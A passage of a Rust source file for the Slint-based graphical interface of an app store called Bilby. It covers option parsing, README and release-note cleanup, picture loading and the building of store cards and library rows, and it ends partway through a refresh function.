//! The graphical store. One Slint window, three interfaces (desktop, mobile, TV), all
//! rendering the same `Store` state that this file fills in from `bilby-core`.
//!
//! Threading: the UI thread never waits on the network. Every catalog call goes through
//! [`App::job`], which runs the work on a worker thread and hands the result back to the
//! UI thread. Under test the same code runs inline, so tests exercise the real handlers.

use bilby_core::catalog::{SearchOutcome, UpdateStatus};
use bilby_core::index::Section as CoreSection;
use bilby_core::install::{self, Action, Dirs};
use bilby_core::model::{age_label, human_count, human_size, AppDetails, AppId, AppSummary, InstallOption, SourceKind};
use bilby_core::platform::{FormFactor, PRESETS};
use bilby_core::state::{now_unix, Favourite, InstalledApp, Settings, State};
use bilby_core::{Catalog, Error, Platform};
use slint::{ComponentHandle, Model, ModelRc, SharedString, VecModel};
use std::cell::RefCell;
use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, RwLock};

slint::include_modules!();

const USAGE: &str = "\
Bilby - app store for GitHub Releases, Codeberg and other repositories, filtered to your device

OPTIONS:
    --ui <desktop|mobile|tv>   Force an interface (default: detected; desktop and mobile
                               also switch with the window width)
    --as <platform>            Preview the store as another machine (bilby-cli --list-platforms)
    --demo                     Built-in fictional catalog, no network
    --open <id or link>        Start on an app's page (github:owner/repo, aur:package, URL)
    --search <words>           Start with a search
    --page <name>              Start on discover, search, library, settings or system
    --theme <system|light|dark>  Override the saved appearance for this run
    --size <WxH>               Initial window size
    --state <file>             Use this file for settings and library instead of the default
    --screenshot <file.png>    Render one frame to a PNG and exit
    --script <steps>           With --screenshot: replay input first. Steps are separated by
                               spaces: up down left right ok back tab wait click:X,Y
                               text:WORD install:N
    --settle <ms>              With --screenshot: wait after the script (default 600)
    --report <file>            With --screenshot: also write the interface's state as text

ENVIRONMENT:
    GITHUB_TOKEN               Raises GitHub's API limit from 60 to 5,000 requests per hour
                               (a token saved in Settings does the same)
";

#[derive(Default)]
pub struct Options {
    pub demo: bool,
    pub platform: Option<Platform>,
    pub shell: Option<Shell>,
    pub open: Option<String>,
    pub search: Option<String>,
    pub page: Option<i32>,
    pub theme: Option<String>,
    pub size: Option<(u32, u32)>,
    pub screenshot: Option<PathBuf>,
    /// Input to replay before the screenshot: `down right ok back click:640,300 ...`.
    pub script: Vec<String>,
    /// Milliseconds to wait after the script before the screenshot is taken.
    pub settle_ms: u64,
    /// With a screenshot: also write what the interface is showing, as `key=value` lines.
    pub report: Option<PathBuf>,
    /// Overrides where downloads, cache and settings go (Android passes its app directories).
    pub dirs: Option<Dirs>,
    pub state_file: Option<PathBuf>,
    /// Run catalog work on the calling thread instead of workers. For tests.
    pub inline: bool,
    /// How downloaded files are handed to the system. Defaults to the desktop's own
    /// handler; tests record the call instead of launching installers.
    pub opener: Option<Opener>,
    /// How an installed app is started ([`install::launch`] unless a test says otherwise).
    pub launcher: Option<Opener>,
    /// How another program is started with arguments (Longboard on an address,
    /// Flatpak to run or remove an app): the program and what to pass it.
    pub runner: Option<Runner>,
    /// The machine whose system details and updates are shown. Defaults to this
    /// computer; the demo and previews of other devices get a made-up one.
    pub host: Option<Arc<dyn bilby_core::os::Host>>,
    /// Whether a game controller is attached (looked up when not given). For tests.
    pub controller: Option<bool>,
    /// The file the store itself runs from, when that is one it can put in the app menu
    /// (an AppImage). `run` fills this in; tests pass a stand-in.
    pub self_program: Option<PathBuf>,
    pub catalog_factory: Option<CatalogFactory>,
    /// The app id the store looks at for its own updates. Defaults to its GitHub
    /// repository; the demo catalog has no such project, so tests name a stand-in.
    pub store_app: Option<String>,
}

pub type Opener = Arc<dyn Fn(&std::path::Path) -> bilby_core::Result<()> + Send + Sync>;
pub type Runner = Arc<dyn Fn(&std::path::Path, &[String]) -> bilby_core::Result<()> + Send + Sync>;

/// Builds the catalog for a platform and the current settings. The default talks to the
/// real sources (or the demo); tests substitute one that can go offline on demand.
pub type CatalogFactory = Arc<dyn Fn(&Platform, &Settings, &Dirs) -> Arc<Catalog> + Send + Sync>;

impl Options {
    pub fn from_args(args: impl Iterator<Item = String>) -> Result<Options, String> {
        let mut o = Options::default();
        let mut args = args.peekable();
        while let Some(arg) = args.next() {
            let mut value = |name: &str| args.next().ok_or_else(|| format!("{name} needs a value\n\n{USAGE}"));
            match arg.as_str() {
                "--demo" => o.demo = true,
                "--ui" => {
                    o.shell = Some(match value("--ui")?.as_str() {
                        "desktop" => Shell::Desktop,
                        "mobile" => Shell::Mobile,
                        "tv" => Shell::Tv,
                        other => return Err(format!("unknown interface \"{other}\" (desktop, mobile, tv)")),
                    })
                }
                "--as" => {
                    let name = value("--as")?;
                    o.platform = Some(
                        Platform::preset(&name)
                            .ok_or_else(|| format!("unknown platform \"{name}\". Known: {}", PRESETS.join(", ")))?,
                    );
                }
                "--open" => o.open = Some(value("--open")?),
                "--search" => o.search = Some(value("--search")?),
                "--page" => {
                    o.page = Some(match value("--page")?.as_str() {
                        "discover" => 0,
                        "search" => 1,
                        "library" => 2,
                        "settings" => 3,
                        "system" => 4,
                        other => {
                            return Err(format!(
                                "unknown page \"{other}\" (discover, search, library, settings, system)"
                            ))
                        }
                    })
                }
                "--theme" => {
                    let v = value("--theme")?;
                    if !["system", "light", "dark"].contains(&v.as_str()) {
                        return Err(format!("unknown theme \"{v}\" (system, light, dark)"));
                    }
                    o.theme = Some(v);
                }
                "--size" => {
                    let v = value("--size")?;
                    let parsed = v.split_once('x').and_then(|(w, h)| Some((w.parse().ok()?, h.parse().ok()?)));
                    o.size = Some(parsed.ok_or_else(|| format!("--size expects WIDTHxHEIGHT, got \"{v}\""))?);
                }
                "--state" => o.state_file = Some(PathBuf::from(value("--state")?)),
                "--screenshot" => o.screenshot = Some(PathBuf::from(value("--screenshot")?)),
                "--report" => o.report = Some(PathBuf::from(value("--report")?)),
                "--script" => o.script = value("--script")?.split(' ').map(str::to_string).collect(),
                "--settle" => {
                    o.settle_ms = value("--settle")?.parse().map_err(|_| "--settle expects milliseconds".to_string())?
                }
                "-h" | "--help" => return Err(USAGE.to_string()),
                other => return Err(format!("unknown option \"{other}\"\n\n{USAGE}")),
            }
        }
        Ok(o)
    }
}

// ---- core data -> UI data ---------------------------------------------------------

const TINTS: [u32; 10] =
    [0x5b8def, 0x8e6cf0, 0xe0679a, 0xe8804a, 0xd9a521, 0x4fb477, 0x2fa7a0, 0x3d9bd8, 0x7a86a8, 0xc65fd0];

fn initials(name: &str) -> String {
    let words: Vec<&str> = name.split(|c: char| !c.is_alphanumeric()).filter(|w| !w.is_empty()).collect();
    let letters: String = match words.as_slice() {
        [] => "?".to_string(),
        [one] => one.chars().take(2).collect(),
        [first, second, ..] => first.chars().take(1).chain(second.chars().take(1)).collect(),
    };
    let mut chars = letters.chars();
    match (chars.next(), chars.next()) {
        (Some(a), Some(b)) => format!("{}{}", a.to_uppercase(), b.to_lowercase()),
        (Some(a), None) => a.to_uppercase().to_string(),
        _ => "?".to_string(),
    }
}

fn tint_for(id: &str) -> slint::Color {
    let key = id.split_once(':').map(|(_, key)| key).unwrap_or(id);
    let hash = key.bytes().fold(5381u32, |h, b| h.wrapping_mul(33) ^ b as u32);
    slint::Color::from_argb_encoded(0xff00_0000 | TINTS[hash as usize % TINTS.len()])
}

/// Release notes are Markdown, often with HTML mixed in; show them as readable plain
/// text. Links keep their words, images and tags go, list markers become bullets.
/// `install-index` values from here up mean "the hidden file numbered index - this".
const HIDDEN_BASE: i32 = 1000;

/// The share of an app's ratings at five stars, then four, down to one. Empty when the
/// breakdown is not known.
fn spread_shares(rating: bilby_core::model::Rating) -> ModelRc<f32> {
    let total: u32 = rating.spread.iter().sum();
    if total == 0 {
        return ModelRc::default();
    }
    let shares: Vec<f32> = rating.spread.iter().rev().map(|n| *n as f32 / total as f32).collect();
    ModelRc::new(VecModel::from(shares))
}

/// "821 ratings", "12k ratings": how many people rated an app.
fn ratings_text(count: u32) -> String {
    if count == 1 {
        "1 rating".to_string()
    } else {
        format!("{} ratings", human_count(count as u64))
    }
}

/// The opening of a README as plain text: what the project says it is, without the
/// title (the page already shows it), badges, pictures, tables or code samples.
fn plain_about(markdown: &str) -> String {
    const LIMIT: usize = 900;
    let mut kept = Vec::new();
    let (mut in_code, mut title_dropped) = (false, false);
    for line in markdown.lines() {
        let start = line.trim_start();
        if start.starts_with("```") || start.starts_with("~~~") {
            in_code = !in_code;
            continue;
        }
        if in_code || start.starts_with('|') {
            continue;
        }
        if !title_dropped && start.starts_with("# ") {
            title_dropped = true;
            continue;
        }
        kept.push(line);
    }
    let text = plain_notes(&kept.join("\n"));
    if text.chars().count() <= LIMIT {
        return text;
    }
    // Stop at the end of a line rather than mid-sentence.
    let cut: String = text.chars().take(LIMIT).collect();
    let end = cut.rfind('\n').filter(|&i| i > LIMIT / 2).unwrap_or(cut.len());
    format!("{}\n…", cut[..end].trim_end())
}

fn plain_notes(markdown: &str) -> String {
    let mut out = String::new();
    let mut blank_run = 0;
    for line in markdown.lines() {
        let line = strip_inline_markup(line.trim_end());
        let trimmed = line.trim_start();
        let indent = line.len() - trimmed.len();
        let text = trimmed.trim_start_matches('#').trim_start();
        let text = match text.strip_prefix("- ").or_else(|| text.strip_prefix("* ")).or_else(|| text.strip_prefix("+ "))
        {
            Some(item) => format!("{}•  {item}", " ".repeat(indent.min(6))),
            None => text.to_string(),
        };
        // Horizontal rules and now-empty lines collapse into a single blank line.
        let text = if text.chars().all(|c| matches!(c, '-' | '=' | '_' | '*' | ' ')) { String::new() } else { text };
        if text.is_empty() {
            blank_run += 1;
            if blank_run > 1 || out.is_empty() {
                continue;
            }
        } else {
            blank_run = 0;
        }
        out.push_str(&text);
        out.push('\n');
        if out.len() > 2400 {
            out.push('…');
            break;
        }
    }
    out.trim().to_string()
}

/// `[words](url)` -> `words`, `![alt](url)` -> nothing, `<tag>` -> nothing, and the
/// emphasis markers `**`, `__` and backticks are dropped.
fn strip_inline_markup(line: &str) -> String {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        // A picture that is also a link (`[![alt](picture)](target)`, the shape of every
        // badge) disappears entirely.
        if c == '[' && chars.get(i + 1) == Some(&'!') && chars.get(i + 2) == Some(&'[') {
            let find = |from: usize, what: char| (from..chars.len()).find(|&j| chars[j] == what);
            let whole = find(i + 3, ']')
                .filter(|&alt| chars.get(alt + 1) == Some(&'('))
                .and_then(|alt| find(alt + 2, ')'))
                .filter(|&picture| chars.get(picture + 1) == Some(&']') && chars.get(picture + 2) == Some(&'('))
                .and_then(|picture| find(picture + 3, ')'));
            if let Some(end) = whole {
                i = end + 1;
                continue;
            }
        }
        let image = c == '!' && chars.get(i + 1) == Some(&'[');
        if c == '[' || image {
            let open = if image { i + 1 } else { i };
            if let Some(close) = (open + 1..chars.len()).find(|&j| chars[j] == ']') {
                if chars.get(close + 1) == Some(&'(') {
                    if let Some(end) = (close + 2..chars.len()).find(|&j| chars[j] == ')') {
                        if !image {
                            out.extend(&chars[open + 1..close]);
                        }
                        i = end + 1;
                        continue;
                    }
                }
            }
        }
        if c == '<' {
            // An HTML tag or an autolink; a lone "<" in prose is kept.
            if let Some(end) = (i + 1..chars.len()).find(|&j| chars[j] == '>') {
                let inner: String = chars[i + 1..end].iter().collect();
                if inner.starts_with("http") {
                    out.push_str(&inner);
                    i = end + 1;
                    continue;
                }
                let tag_like = inner.starts_with('/')
                    || inner.starts_with('!')
                    || inner.chars().next().is_some_and(|c| c.is_ascii_alphabetic());
                if tag_like && !inner.contains('<') {
                    i = end + 1;
                    continue;
                }
            }
        }
        if c == '`' || (c == '*' && chars.get(i + 1) == Some(&'*')) || (c == '_' && chars.get(i + 1) == Some(&'_')) {
            i += if c == '`' { 1 } else { 2 };
            continue;
        }
        out.push(c);
        i += 1;
    }
    out
}

fn option_row(o: &InstallOption) -> OptionRow {
    OptionRow {
        file: o.asset.name.clone().into(),
        label: o.label().into(),
        size: human_size(o.asset.size).into(),
        note: o.verdict.note.clone().unwrap_or_default().into(),
        native: o.verdict.level == bilby_core::compat::Level::Native,
        verified: install::checkable_digest(&o.asset).is_some() && o.plan.action != Action::ShowCommand,
        verb: o.plan.verb.clone().into(),
        steps: ModelRc::new(VecModel::from(o.plan.steps.iter().map(SharedString::from).collect::<Vec<_>>())),
        command: o.plan.command.clone().unwrap_or_default().into(),
    }
}

fn plural(n: usize, word: &str) -> String {
    if n == 1 {
        format!("1 {word}")
    } else {
        format!("{n} {word}s")
    }
}

fn theme_mode(name: &str) -> i32 {
    match name {
        "light" => 1,
        "dark" => 2,
        _ => 0,
    }
}

/// 0 decide for me, 1 desktop, 2 TV: the saved layout choice as the interface shows it.
fn interface_mode(saved: &str) -> i32 {
    match saved {
        "desktop" => 1,
        "tv" => 2,
        _ => 0,
    }
}

/// The shape to behave as, given the saved layout choice and what was detected.
fn form_for(saved: &str, detected: FormFactor) -> FormFactor {
    match saved {
        "tv" => FormFactor::Tv,
        // "Desktop" on a phone still means the phone's own layout.
        "desktop" if detected == FormFactor::Tv => FormFactor::Desktop,
        _ => detected,
    }
}

fn shell_for(form_factor: FormFactor) -> Shell {
    match form_factor {
        FormFactor::Desktop => Shell::Desktop,
        FormFactor::Mobile => Shell::Mobile,
        FormFactor::Tv => Shell::Tv,
    }
}

fn make_catalog(platform: &Platform, demo: bool, settings: &Settings, dirs: &Dirs) -> Arc<Catalog> {
    let mut catalog = if demo {
        Catalog::demo(platform.clone())
    } else {
        // A token typed into Settings wins over the environment.
        let token = Some(settings.github_token.clone())
            .filter(|t| !t.trim().is_empty())
            .or_else(|| std::env::var("GITHUB_TOKEN").ok());
        Catalog::live(platform.clone(), token, dirs.cache.clone())
    };
    catalog.include_prereleases = settings.include_prereleases;
    catalog.use_flatpak_roots(dirs.flatpak_roots.clone());
    Arc::new(catalog)
}

// ---- application state ------------------------------------------------------------

thread_local! {
    /// Decoded app pictures by owner. Images belong to the UI thread, so they live here
    /// rather than in `App`, which worker threads share.
    static PICTURES: RefCell<HashMap<String, slint::Image>> = RefCell::new(HashMap::new());
}

/// Decode a cached PNG or JPEG into something Slint can draw. Implausible sizes are
/// refused: an avatar is small, and a huge image would only cost memory.
fn decode_picture(path: &std::path::Path) -> Option<slint::Image> {
    let decoded = image::open(path).ok()?.into_rgba8();
    let (width, height) = decoded.dimensions();
    if width == 0 || height == 0 || width > 1024 || height > 1024 {
        return None;
    }
    let buffer = slint::SharedPixelBuffer::<slint::Rgba8Pixel>::clone_from_slice(decoded.as_raw(), width, height);
    Some(slint::Image::from_rgba8(buffer))
}

/// Decode a cached screenshot, scaled down to what a page can use. Tiny images are
/// not screenshots, and absurd ones are refused before they cost memory.
fn decode_screenshot(path: &std::path::Path) -> Option<slint::SharedPixelBuffer<slint::Rgba8Pixel>> {
    let (width, height) = image::image_dimensions(path).ok()?;
    if width < 200 || height < 120 || width > 8000 || height > 8000 {
        return None;
    }
    let decoded = image::open(path).ok()?;
    // Shrink what is larger than a page can show; never enlarge.
    let decoded = if width > 1280 || height > 720 { decoded.thumbnail(1280, 720) } else { decoded }.into_rgba8();
    let (width, height) = decoded.dimensions();
    Some(slint::SharedPixelBuffer::<slint::Rgba8Pixel>::clone_from_slice(decoded.as_raw(), width, height))
}

/// The app's own logo when one is known, else its owner's picture.
fn picture_for(id: &str) -> slint::Image {
    let Some(id) = AppId::parse(id) else { return slint::Image::default() };
    let own = bilby_core::icons::app_key(&id);
    PICTURES.with(|p| {
        let pictures = p.borrow();
        pictures
            .get(&own)
            .or_else(|| bilby_core::icons::icon_key(&id).and_then(|owner| pictures.get(&owner)))
            .cloned()
            .unwrap_or_default()
    })
}

/// The app currently on the details page.
#[derive(Default)]
struct Current {
    id: String,
    details: Option<AppDetails>,
    /// Index into `details.versions` of the release on screen; `None` when the app has
    /// nothing for this machine and only the explanation is shown.
    selected: Option<usize>,
}

impl Current {
    fn release(&self) -> Option<&bilby_core::model::ResolvedRelease> {
        let details = self.details.as_ref()?;
        match self.selected {
            Some(index) => details.versions.get(index),
            None => details.release.as_ref(),
        }
    }
}

pub struct App {
    ui: slint::Weak<AppWindow>,
    catalog: RwLock<Arc<Catalog>>,
    platform: RwLock<Platform>,
    /// What the device was found to be, before any choice of layout was applied.
    detected: FormFactor,
    /// A theme given on the command line, which outranks the saved one.
    theme_override: Option<String>,
    inline: bool,
    dirs: Dirs,
    state_path: PathBuf,
    state: Mutex<State>,
    results: Mutex<(String, Vec<AppSummary>)>,
    updates: Mutex<HashMap<String, UpdateStatus>>,
    last_checked: AtomicU64,
    current: Mutex<Current>,
    /// Bumped per request so a slow, superseded answer is dropped instead of shown.
    search_generation: AtomicU64,
    details_generation: AtomicU64,
    /// An app whose install was asked for from a list, before its files were known.
    install_when_loaded: Mutex<Option<String>>,
    toast_generation: Arc<AtomicU64>,
    cancel_install: Arc<AtomicBool>,
    /// The store's own app id, checked for updates like any other app. `None` in the
    /// demo, whose fictional GitHub does not have it.
    store_app: Option<AppId>,
    /// Library apps waiting their turn after "Update all".
    update_queue: Mutex<std::collections::VecDeque<String>>,
    /// Owners whose picture has been asked for in this session (found or not).
    pictures_requested: Mutex<HashSet<String>>,
    opener: Opener,
    launcher: Opener,
    runner: Runner,
    /// Icon addresses the sources gave, by app id.
    icon_urls: Mutex<HashMap<String, String>>,
    catalog_factory: CatalogFactory,
    /// The machine itself, what it is, and what the last look for updates found.
    host: Arc<dyn bilby_core::os::Host>,
    system: bilby_core::os::Report,
    system_check: Mutex<Option<bilby_core::os::Check>>,
    /// Lists fetched from the sources (popular on Flathub, ...), shown under the
    /// hand-picked ones once they arrive.
    collections: Mutex<Vec<CoreSection>>,
    /// The store's own file, when it can be put in the app menu.
    self_program: Option<PathBuf>,
}

/// The store's icon, written beside its app-menu entry.
const ICON_PNG: &[u8] = include_bytes!("../../../packaging/bilby.png");

impl App {
    fn catalog(&self) -> Arc<Catalog> {
        self.catalog.read().unwrap().clone()
    }

    /// The settings and library as they are right now.
    pub fn state(&self) -> State {
        self.state.lock().unwrap().clone()
    }

    /// Change the saved state and write it to disk. A failed write is reported, not fatal.
    fn update_state(&self, ui: &AppWindow, change: impl FnOnce(&mut State)) {
        let result = {
            let mut state = self.state.lock().unwrap();
            change(&mut state);
            state.save(&self.state_path)
        };
        if let Err(e) = result {
            self.toast(ui, &format!("Couldn't save your settings: {e}"), true);
        }
    }

    /// Run `work` off the UI thread, then `done` on it. Inline under test.
    fn job<T: Send + 'static>(
        self: &Arc<Self>,
        work: impl FnOnce(&App) -> T + Send + 'static,
        done: impl FnOnce(&Arc<App>, &AppWindow, T) + Send + 'static,
    ) {
        if self.inline {
            let result = work(self);
            if let Some(ui) = self.ui.upgrade() {
                done(self, &ui, result);
                self.refresh_quota(&ui);
                self.load_pictures(&ui);
            }
            return;
        }
        let app = self.clone();
        std::thread::spawn(move || {
            let result = work(&app);
            let weak = app.ui.clone();
            let _ = slint::invoke_from_event_loop(move || {
                if let Some(ui) = weak.upgrade() {
                    done(&app, &ui, result);
                    app.refresh_quota(&ui);
                    app.load_pictures(&ui);
                }
            });
        });
    }

    /// Fetch pictures for every app on screen that does not have one yet. Runs after
    /// each job, so whatever a job put on screen gets its pictures; owners already asked
    /// for are skipped, which is also what ends the chain.
    pub fn load_pictures(self: &Arc<Self>, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let mut shown: Vec<String> = Vec::new();
        for section in store.get_sections().iter() {
            shown.extend(section.apps.iter().map(|c| c.id.to_string()));
        }
        shown.extend(store.get_results().iter().map(|c| c.id.to_string()));
        shown.extend(store.get_suggestions().iter().map(|c| c.id.to_string()));
        shown.extend(store.get_library().iter().map(|r| r.card.id.to_string()));
        shown.push(store.get_app().id.to_string());

        // For each app: its own logo (an address the source gave, or one found earlier
        // and kept on disk), and its owner's picture to fall back on.
        let wanted: Vec<(String, AppId, Option<String>)> = {
            let mut requested = self.pictures_requested.lock().unwrap();
            let urls = self.icon_urls.lock().unwrap();
            let mut wanted = Vec::new();
            let icons = self.dirs.cache.join("icons");
            for id in shown.iter().filter_map(|id| AppId::parse(id)) {
                let own = bilby_core::icons::app_key(&id);
                match urls.get(&id.to_string()) {
                    Some(url) => {
                        if requested.insert(own.clone()) {
                            wanted.push((own, id.clone(), Some(url.clone())));
                        }
                    }
                    // No address yet. A logo found on an earlier visit is used; otherwise
                    // the question stays open, because the address may still arrive.
                    None => {
                        if !requested.contains(&own) && matches!(bilby_core::icons::cached(&icons, &own), Some(Some(_)))
                        {
                            requested.insert(own.clone());
                            wanted.push((own, id.clone(), Some(String::new())));
                        }
                    }
                }
                if let Some(owner) = bilby_core::icons::icon_key(&id) {
                    if requested.insert(owner.clone()) {
                        wanted.push((owner, id, None));
                    }
                }
            }
            wanted
        };
        if wanted.is_empty() {
            return;
        }
        let dir = self.dirs.cache.join("icons");
        self.job(
            move |app| {
                let http = app.catalog().http();
                wanted
                    .into_iter()
                    .filter_map(|(key, id, own)| {
                        let path = match own {
                            // No address: only what an earlier visit to its page left on disk.
                            Some(url) if url.is_empty() => bilby_core::icons::cached(&dir, &key).flatten(),
                            Some(url) => {
                                bilby_core::icons::fetch_picture(http.as_ref(), &dir, &key, &url, 2 * 1024 * 1024)
                                    .ok()?
                            }
                            None => bilby_core::icons::fetch(http.as_ref(), &dir, &id).ok()?,
                        };
                        Some((key, path?))
                    })
                    .collect::<Vec<_>>()
            },
            |app, ui, found| {
                if found.is_empty() {
                    return;
                }
                PICTURES.with(|pictures| {
                    for (key, path) in found {
                        // A file that will not decode is simply not shown.
                        if let Some(image) = decode_picture(&path) {
                            pictures.borrow_mut().insert(key, image);
                        }
                    }
                });
                app.refresh(ui);
                let store = ui.global::<Store>();
                let mut card = store.get_app();
                card.icon = picture_for(&card.id);
                store.set_app(card);
                let suggestions: Vec<AppCard> = store
                    .get_suggestions()
                    .iter()
                    .map(|mut c| {
                        c.icon = picture_for(&c.id);
                        c
                    })
                    .collect();
                store.set_suggestions(ModelRc::new(VecModel::from(suggestions)));
            },
        );
    }

    fn toast(&self, ui: &AppWindow, message: &str, is_error: bool) {
        let store = ui.global::<Store>();
        store.set_toast(message.into());
        store.set_toast_is_error(is_error);
        let generation = self.toast_generation.fetch_add(1, Ordering::SeqCst) + 1;
        if self.inline {
            return;
        }
        // Errors stay longer. The timer only clears the toast it was started for.
        let latest = self.toast_generation.clone();
        let weak = self.ui.clone();
        slint::Timer::single_shot(std::time::Duration::from_secs(if is_error { 7 } else { 4 }), move || {
            if latest.load(Ordering::SeqCst) == generation {
                if let Some(ui) = weak.upgrade() {
                    ui.global::<Store>().set_toast(SharedString::new());
                }
            }
        });
    }

    // ---- cards ----

    fn card(&self, app: &AppSummary) -> AppCard {
        let id = app.id.to_string();
        let popularity = match (app.popularity, app.id.source) {
            // A count of nothing is left out: it reads as a verdict, and is usually just
            // an app nobody has got round to starring.
            (Some(0), _) | (None, _) => String::new(),
            (Some(n), SourceKind::GitHub | SourceKind::Codeberg) => format!("{} stars", human_count(n)),
            (Some(n), SourceKind::Flathub) => format!("{} installs a month", human_count(n)),
            (Some(n), SourceKind::Aur) => format!("{} votes", human_count(n)),
            _ => String::new(),
        };
        let downloads = match app.downloads {
            Some(n) if n > 0 => format!("{} downloads", human_count(n)),
            _ => String::new(),
        };
        // Downloads say "people use this" in words everyone knows; stars need explaining.
        let headline = if downloads.is_empty() { popularity.clone() } else { downloads.clone() };
        if let Some(url) = &app.icon_url {
            self.icon_urls.lock().unwrap().insert(id.clone(), url.clone());
        }
        // In the store's library, or already installed by the system's package manager.
        let installed = self.state.lock().unwrap().installed(&id).is_some() || app.installed_version.is_some();
        let has_update = matches!(self.updates.lock().unwrap().get(&id), Some(UpdateStatus::Available { .. }));
        let rating = app.rating.or_else(|| self.catalog().rating_for(&app.id));
        AppCard {
            tint: tint_for(&id),
            icon: picture_for(&id),
            id: id.into(),
            name: app.name.clone().into(),
            author: app.author.clone().into(),
            summary: app.summary.clone().into(),
            // A repository package says which repository; the rest say which service.
            source: app.origin.clone().unwrap_or_else(|| app.id.source.label().to_string()).into(),
            badge: app.install_label.clone().unwrap_or_default().into(),
            version: app.version.clone().unwrap_or_default().into(),
            popularity: popularity.into(),
            initials: initials(&app.name).into(),
            installed,
            rating: rating.map(bilby_core::ratings::stars_text).unwrap_or_default().into(),
            rating_count: rating.map(|r| ratings_text(r.count)).unwrap_or_default().into(),
            rating_spread: rating.map(spread_shares).unwrap_or_default(),
            // A forge counts the files of the releases it listed; Flathub counts every install.
            downloads_note: if app.id.source == SourceKind::Flathub { "in total" } else { "of recent versions" }.into(),
            downloads: downloads.into(),
            headline: headline.into(),
            verified: app.verified,
            has_update: installed && has_update,
        }
    }

    fn cards(&self, apps: &[AppSummary]) -> ModelRc<AppCard> {
        ModelRc::new(VecModel::from(apps.iter().map(|a| self.card(a)).collect::<Vec<_>>()))
    }

    fn library_card(&self, app: &InstalledApp) -> AppCard {
        let update = self.updates.lock().unwrap().get(&app.id).cloned();
        let (version, has_update) = match update {
            Some(UpdateStatus::Available { version, .. }) => (format!("{} → {version}", app.version), true),
            _ => (app.version.clone(), false),
        };
        AppCard {
            id: app.id.as_str().into(),
            name: app.name.as_str().into(),
            author: app.author.as_str().into(),
            summary: app.summary.as_str().into(),
            source: AppId::parse(&app.id).map(|id| id.source.label()).unwrap_or("").into(),
            badge: app.label.as_str().into(),
            version: version.into(),
            popularity: SharedString::new(),
            initials: initials(&app.name).into(),
            tint: tint_for(&app.id),
            icon: picture_for(&app.id),
            installed: true,
            rating: SharedString::new(),
            rating_count: SharedString::new(),
            rating_spread: ModelRc::default(),
            downloads: SharedString::new(),
            downloads_note: SharedString::new(),
            headline: SharedString::new(),
            verified: false,
            has_update,
        }
    }

    fn favourite_card(&self, favourite: &Favourite) -> AppCard {
        let state = self.state.lock().unwrap();
        let installed = state.installed(&favourite.id);
        AppCard {
            id: favourite.id.as_str().into(),
            name: favourite.name.as_str().into(),
            author: favourite.author.as_str().into(),
            summary: favourite.summary.as_str().into(),
            source: AppId::parse(&favourite.id).map(|id| id.source.label()).unwrap_or("").into(),
            badge: SharedString::new(),
            version: installed.map(|a| a.version.clone()).unwrap_or_default().into(),
            popularity: SharedString::new(),
            initials: initials(&favourite.name).into(),
            tint: tint_for(&favourite.id),
            icon: picture_for(&favourite.id),
            installed: installed.is_some(),
            rating: SharedString::new(),
            rating_count: SharedString::new(),
            rating_spread: ModelRc::default(),
            downloads: SharedString::new(),
            downloads_note: SharedString::new(),
            headline: SharedString::new(),
            verified: false,
            has_update: false,
        }
    }

    // ---- pages ----

    /// Discover, the TV rows and the library all depend on the same data; redraw them
    /// together so "Installed" and "Update" markers never disagree between pages.
    pub fn refresh(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        // The hand-picked list first, then the lists the sources keep themselves.
        let mut featured = self.catalog().featured();
        featured.extend(self.collections.lock().unwrap().iter().cloned());
        let to_sections = |list: &[CoreSection]| -> Vec<Section> {
            list.iter().map(|s| Section { title: s.title.clone().into(), apps: self.cards(&s.apps) }).collect()
        };
        store.set_sections(ModelRc::new(VecModel::from(to_sections(&featured))));
        store.set_categories(ModelRc::new(VecModel::from(
            featured.iter().map(|s| SharedString::from(&s.title)).collect::<Vec<_>>(),
        )));
        if !featured.iter().any(|s| s.title == store.get_category().as_str()) {
            store.set_category(SharedString::new());
        }
        store.set_spotlight(featured.first().and_then(|s| s.apps.first()).map(|a| self.card(a)).unwrap_or_default());

        let state = self.state();
        let updates = self.updates.lock().unwrap().clone();
        let now = now_unix();
        let mut rows: Vec<LibraryRow> = state
            .library
            .iter()
            .map(|app| {
                // Entries that came from a backup or an older file have no install time.
                let date =
                    if app.installed_at == 0 { String::new() } else { age_label(&unix_date(app.installed_at), now) };
                // The kind of file is on the app's page; here the version and age are enough.
                let mut detail = app.version.clone();
                if !date.is_empty() {
                    detail.push_str(&format!("  ·  installed {date}"));
                }
                let (status, status_text) = match updates.get(&app.id) {
                    None => (0, String::new()),
                    Some(UpdateStatus::UpToDate) if !app.skipped_version.is_empty() => {
                        (2, format!("Up to date  ·  skipping {}", app.skipped_version))
                    }
                    Some(UpdateStatus::UpToDate) => (2, "Up to date".to_string()),
                    Some(UpdateStatus::Available { version, .. }) => (3, format!("Update available: {version}")),
                    Some(UpdateStatus::Unknown(why)) => (4, format!("Couldn't check: {why}")),
                };
                LibraryRow {
                    card: self.library_card(app),
                    detail: detail.into(),
                    status,
                    status_text: status_text.into(),
                    store_managed: app.store_managed,
                }
            })
            .collect();
        // Apps with an update waiting come first; otherwise most recently installed first.
        rows.sort_by_key(|r| r.status != 3);
        let update_count = rows.iter().filter(|r| r.status == 3).count();
        store.set_updates_count(update_count as i32);
        store.set_library(ModelRc::new(VecModel::from(rows)));
        let favourites: Vec<AppCard> = state.favourites.iter().map(|f| self.favourite_card(f)).collect();
        store.set_favourites(ModelRc::new(VecModel::from(favourites)));
        store.set_is_favourite(state.is_favourite(store.get_app().id.as_str()));
        store.set_can_open(self.launchable(store.get_app().id.as_str()).is_some());
        store.set_in_library(state.installed(store.get_app().id.as_str()).is_some());
        let checked = self.last_checked.load(Ordering::SeqCst);
        store.set_last_checked(
            match now.saturating_sub(checked) {
                _ if checked == 0 => String::new(),
                s if s < 90 => "just now".to_string(),
                s if s < 3600 => format!("{} minutes ago", s / 60),
                s => format!("{} hours ago", s / 3600),
            }
            .into(),
        );
        store.set_recent(ModelRc::new(VecModel::from(
            state.recent_searches.iter().map(SharedString::from).collect::<Vec<_>>(),
        )));

        // Search results keep their markers in sync too.
        let (query, results) = self.results.lock().unwrap().clone();
        store.set_results(self.cards(&results));

        // TV: the Library page has updates first, then the rest, then favourites.
